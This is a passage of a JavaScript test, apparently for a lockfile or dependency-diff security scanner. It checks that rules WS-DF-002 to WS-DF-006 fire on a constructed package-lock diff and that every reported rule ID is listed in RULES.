  const base = mem({ "yarn.lock": "", "package-lock.json": npmLock({ "node_modules/x": reg("x", "0.9.0") }) });
  const ids = new Set(diffTrees(base, head, testCtx()).findings.map((f) => f.ruleId));
  for (const id of ["WS-DF-002", "WS-DF-003", "WS-DF-004", "WS-DF-005", "WS-DF-006"]) assert.ok(ids.has(id), `positive control: ${id}`);
  const known = new Set(RULES.map((r) => r.id));
  for (const id of ids) assert.ok(known.has(id), `${id} is not in RULES`);
});
